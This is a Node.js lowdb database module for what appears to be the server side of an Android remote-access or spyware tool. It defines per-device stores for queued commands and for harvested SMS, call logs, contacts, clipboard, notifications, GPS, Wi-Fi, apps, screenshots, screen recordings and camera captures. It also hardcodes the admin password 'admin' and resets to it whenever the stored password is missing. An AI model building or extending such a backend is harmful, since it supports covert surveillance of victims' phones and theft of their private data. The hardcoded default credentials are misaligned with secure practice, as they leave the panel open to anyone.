const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

// Forcefully reset if password is missing
const admin = db.get('admin').value();
if (!admin || !admin.password) {
    db.set('admin', {
        username: 'admin',
        password: 'admin',
        loginToken: '',
        logs: [],
        ipLog: []
    }).write();
}

// Safe default for first-time run
db.defaults({
    admin: {
        username: 'admin',
        password: 'admin',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write();

class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'));
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: [],
            lockDevice: [],
            screenShot: [],
            screenRecord: [],
            rearCam: [],
            frontCam: []
        }).write();
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};
